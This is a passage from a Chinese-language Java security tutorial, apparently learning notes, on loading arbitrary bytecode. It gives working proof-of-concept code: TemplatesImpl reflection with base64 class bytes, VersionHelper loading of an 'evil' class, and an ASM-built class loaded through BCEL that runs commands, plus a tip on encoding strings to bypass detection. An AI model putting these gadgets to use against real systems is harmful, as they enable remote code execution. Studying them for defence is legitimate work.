在`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 这个类中定义了一个内部类 `TransletClassLoader` ，这个类里重写了 `defineClass` 方法，并且这里没有显式地声明其定义域。Java 中默认情况下，如果一个方法没有显式声明作用域，其作用域为 default。因此，这里被重写的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。

其中`TransletClassLoader#defineClass()`可以如下追溯

```java
TemplatesImpl#getOutputProperties()
-> TemplatesImpl#newTransformer()
-> TemplatesImpl#getTransletInstance() 
-> TemplatesImpl#defineTransletClasses() 
-> TransletClassLoader#defineClass()
```

其中，前两个方法`TemplatesImpl#getOutputProperties()` 、 `TemplatesImpl#newTrans`，他们的作用域是`public`，可以尝试呗外部调用。尝试用 `newTransformer()` 构造一个简单的 POC

```java
package com.Template;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.TransformerConfigurationException;
import java.lang.reflect.Field;
import java.util.Base64;

public class Tem_Test {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, TransformerConfigurationException {
        String code = "yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTGNvbS9DYWxjOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHACYBAApTb3VyY2VGaWxlAQAJQ2FsYy5qYXZhDAAZABoHACcMACgAKQEACGNhbGMuZXhlDAAqACsBAAhjb20vQ2FsYwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAADwALAAAAIAADAAAAAQAMAA0AAAAAAAEADgAPAAEAAAABABAAEQACABIAAAAEAAEAEwABAAcAFAACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAFAALAAAAKgAEAAAAAQAMAA0AAAAAAAEADgAPAAEAAAABABUAFgACAAAAAQAXABgAAwASAAAABAABABMAAQAZABoAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAWAAQAFwANABgACwAAAAwAAQAAAA4ADAANAAAAEgAAAAQAAQAbAAEAHAAAAAIAHQ==";
        byte[] byteCode = Base64.getDecoder().decode(code);

        TemplatesImpl obj = new TemplatesImpl();
        // _bytecodes 是由字节码组成的数组
        Class c = TemplatesImpl.class;
        Field _bytecodes = c.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        _bytecodes.set(obj, new byte[][]{byteCode});

        // _name 可以是任意字符串，只要不为 null 即可
        Field _name = c.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(obj, "Calc");

        // 固定写法
        Field _tfactory = c.getDeclaredField("_tfactory");
        _tfactory.setAccessible(true);
        _tfactory.set(obj, new TransformerFactoryImpl());
        
        obj.newTransformer();

    }
}

```

`TemplatesImpl` 中对加载的字节码是有一定要求的：这个字节码对应的类必须是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的子类

于是我们可以编写这样一个类

```java
package com;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Calc extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    public Calc() throws IOException {
        super();
        Runtime.getRuntime().exec("calc.exe");
    }
}

```

### shiro中的利用

具体可以看p师傅的《Java安全漫谈 - 15.TemplatesImpl在Shiro 中的利用》

其中`TemplatesImpl`的初始化可以简化为

```java
public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

TemplatesImpl obj = new TemplatesImpl();
setFieldValue(obj, "_bytecodes", new byte[][] {"...bytescode"});
setFieldValue(obj, "_name", "HelloTemplatesImpl");
setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
obj.newTransformer();
```

## 0x06 VersionHelper

直接写到临时文件下，然后进行加载

注：恶意类不要其他的包名

```java
package com.VersionHelper;

import com.sun.naming.internal.VersionHelper;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Version_Test {

    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException {

        String cmd = "calc.exe";
        String tmp = System.getProperty("java.io.tmpdir");
        String jarPath = tmp + File.separator + "ByteCodeEvil.class";
        Files.write(Paths.get(jarPath), Base64.getDecoder().decode("yv66vgAAADQARQoAEQAjBwAkCgACACMHACUHACYKACcAKAoAJwApCgAqACsKAAUALAoABAAtCgAEAC4KAAIALwgAMAoAAgAxCQAQADIHADMHADQBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAMwcANQcAJAcAJQEACkV4Y2VwdGlvbnMHADYBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAUADcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwA4DAA5ADoMADsAPAcAPQwAPgA/DAAUAEAMABQAQQwAQgAgDABDAEQBAAEKDAAfACAMABIAEwEADEJ5dGVDb2RlRXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAACYAAYABQAAAEcqtwABuwACWbcAA027AARZuwAFWbgABiu2AAe2AAi3AAm3AApOLbYAC1k6BMYAEiwZBLYADBINtgAMV6f/6iostgAOtQAPsQAAAAIAFwAAAB4ABwAAAAcABAAIAAwACQAlAAsALwAMAD4ADgBGAA8AGAAAABsAAv8AJQAEBwAZBwAaBwAbBwAcAAD8ABgHABoAHQAAAAQAAQAeAAEAHwAgAAEAFgAAAB0AAQABAAAABSq0AA+wAAAAAQAXAAAABgABAAAAEwABACEAAAACACI="));

        VersionHelper helper = VersionHelper.getVersionHelper();
        Class<?> clazz = helper.loadClass("ByteCodeEvil", "file:" + tmp + File.separator);
        Constructor<?> constructor = clazz.getConstructor(String.class);
        Object obj = constructor.newInstance(cmd);
        System.out.println(obj.toString());
    }
}

```

## 0x07 ASM加载

需要手动操纵字节码的需求，可以使用ASM，它可以直接生产 .class字节码文件，也可以在类被加载入JVM之前动态修改类行为）

相关原理如下图所示：

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220313175434.png)



> ASM是Java操纵类字节码的工具，ASM提供两类API，能够分别将类表示为事件和对象。我们先主要了解核心API，即能够将类以事件方式操纵的方式，即用**基于事件的模型**。

> 在采用基于事件的模型时，类是用一系列事件来表示的，每个事件表示类的一个元素，比 如 它的一个标头、一个字段、一个方法声明、一条指令，等等。基于事件的 API 定义了一组 可能 事件，以及这些事件必须遵循的发生顺序，还提供了一个类分析器，为每个被分析元素生 成一个 事件，还提供一个类写入器，由这些事件的序列生成经过编译的类。

下面介绍一下常用API的使用

### ClassVistor

ClassVistor用于访问class，本身是抽象类。**定义在读取Class字节码时会触发的事件。**只要将所需执行的操作写入对应方法下，调用ClassVistor的其他类就能在对应的条件下触发他们。

```java
public ClassVisitor(int api, ClassVisitor cv);
public void visit(int version, int access, String name, String signature, String superName, String[] interfaces);
public void visitSource(String source, String debug);
public void visitOuterClass(String owner, String name, String desc); 
AnnotationVisitor visitAnnotation(String desc, boolean visible); 
public void visitAttribute(Attribute attr);
public void visitInnerClass(String name, String outerName, String innerName, int access);
public FieldVisitor visitField(int access, String name, String desc, String signature, Object value);
public MethodVisitor visitMethod(int access, String name,String desc,String signature, String[] exceptions);
void visitEnd();

```

简要说明一下下文用到的方法参数

```java
public void visit(int version, int access, String name, String signature, String superName, String[] interfaces);
```

* version为编辑的类的java版本，例如V1_8;

* access为访问标识，即该类的修饰，如ACC_PUBLIC. 若一个类具有多个修饰符，将Opcode码相加即可;

* name为类的内部名；

* signature为签名，可为null；

* superName描述它的超类，即extends的类，填写内部名；

* superName描述它的接口，即implements的类，填写内部名；

注：**ClassWriter继承了ClassVisitor**。

其中，还是用的到了如下函数

methodVisitor .visitXXXInsn()来填充函数，添加方法实现的字节码

- visitVarInsn(int opcode, int var) ：带有参数的字节码指令
- visitInsn(int opcode) ： 无参数的字节码指令
- visitLdcInsn(Object cst): LDC专用指令。LDC_W，LDC2_W已被废弃
- visitTypeInsn(int opcode, String type) ：带有引用类型参数的字节码指令
- visitMethodInsn(int opcode, String owner, String name,String desc)：调用方法
- visitFieldInsn(int opcode, String owner, String name, String desc)：操作变量

字节码指令如下：

```java
0: iload_1
1: iflt          12     ###如果栈顶值<=0，则跳转至label标记指定的指令，否则顺序执行
4: aload_0
5: iload_1
6: putfield      #2     // Field f:I
9: goto          20     ####无条件跳转
###创建一个异常对象，并压入栈顶。
12: new          #3     // class java/lang/IllegalArgumentException
15: dup                 ####栈顶值再入栈一次，此时栈顶前2位都是同一个值
###invokespecial 弹出栈顶元素，调用其构造函数，此时栈顶值仍然是异常对象
16: invokespecial #4    // Method java/lang/IllegalArgumentException."<init>":()V  
19: athrow    ###弹出剩下的异常的副本，
20: return
```

最后我们的demo可以为

```java
package com.ASM;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import static jdk.internal.org.objectweb.asm.Opcodes.*;

public class ASM_Test {
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, IOException {
        // 注意导入开头为jdk.internal
        // 注意flag为COMPUTE_FRAMES否则报错
        jdk.internal.org.objectweb.asm.ClassWriter classWriter = new jdk.internal.org.objectweb.asm.ClassWriter(
                jdk.internal.org.objectweb.asm.ClassWriter.COMPUTE_FRAMES);
        // 类属性visitor
        jdk.internal.org.objectweb.asm.FieldVisitor fieldVisitor;
        // 类方法visitor
        jdk.internal.org.objectweb.asm.MethodVisitor methodVisitor;
        // 类名可以自行修改
        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, "com/ByteCodeEvil", null, "java/lang/Object", null);
        fieldVisitor = classWriter.visitField(0, "res", "Ljava/lang/String;", null, null);
        fieldVisitor.visitEnd();
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "(Ljava/lang/String;)V", null, new String[]{"java/io/IOException"});
        methodVisitor.visitCode();
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        methodVisitor.visitTypeInsn(NEW, "java/lang/StringBuilder");
        methodVisitor.visitInsn(DUP);
        methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
        methodVisitor.visitVarInsn(ASTORE, 2);
        methodVisitor.visitTypeInsn(NEW, "java/io/BufferedReader");
        methodVisitor.visitInsn(DUP);
        methodVisitor.visitTypeInsn(NEW, "java/io/InputStreamReader");
        methodVisitor.visitInsn(DUP);
        // 这里可以针对字符串做拆分编码等操作来Bypass
        methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        methodVisitor.visitVarInsn(ALOAD, 1);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Process", "getInputStream", "()Ljava/io/InputStream;", false);
        methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/InputStreamReader", "<init>", "(Ljava/io/InputStream;)V", false);
        methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/BufferedReader", "<init>", "(Ljava/io/Reader;)V", false);
        methodVisitor.visitVarInsn(ASTORE, 3);
        jdk.internal.org.objectweb.asm.Label label0 = new jdk.internal.org.objectweb.asm.Label();
        methodVisitor.visitLabel(label0);
        methodVisitor.visitVarInsn(ALOAD, 3);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/BufferedReader", "readLine", "()Ljava/lang/String;", false);
        methodVisitor.visitInsn(DUP);
        methodVisitor.visitVarInsn(ASTORE, 4);
        jdk.internal.org.objectweb.asm.Label label1 = new jdk.internal.org.objectweb.asm.Label();
        methodVisitor.visitJumpInsn(IFNULL, label1);
        methodVisitor.visitVarInsn(ALOAD, 2);
        methodVisitor.visitVarInsn(ALOAD, 4);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
        methodVisitor.visitLdcInsn("\n");
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
        methodVisitor.visitInsn(POP);
        methodVisitor.visitJumpInsn(GOTO, label0);
        methodVisitor.visitLabel(label1);
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitVarInsn(ALOAD, 2);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
        methodVisitor.visitFieldInsn(PUTFIELD, "com/ByteCodeEvil", "res", "Ljava/lang/String;");
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(6, 5);
        methodVisitor.visitEnd();
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "toString", "()Ljava/lang/String;", null, null);
        methodVisitor.visitCode();
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitFieldInsn(GETFIELD, "com/ByteCodeEvil", "res", "Ljava/lang/String;");
        methodVisitor.visitInsn(ARETURN);
        methodVisitor.visitMaxs(1, 1);
        methodVisitor.visitEnd();
        classWriter.visitEnd();
        byte[] code = classWriter.toByteArray();
        String cmd = "calc.exe";
        // 对bytes类型字节码进行BCEL转换
        String byteCode = com.sun.org.apache.bcel.internal.classfile.Utility.encode(code, true);
        byteCode = "$$BCEL$$" + byteCode;
        // 使用BCELClassLoader加载构造的字节码
        Class<?> c = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
        ClassLoader loader = (ClassLoader) c.newInstance();
        Class<?> clazz = loader.loadClass(byteCode);
        java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(String.class);
        Object obj = constructor.newInstance(cmd);
        System.out.println(obj.toString());
    }
}

```

## 0x08 参考

https://blog.csdn.net/it_freshman/article/details/81156106

https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html

https://xz.aliyun.com/t/10535#toc-0

https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/#1-java-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81
这是学习 ClassLoader时候所编写的demo代码
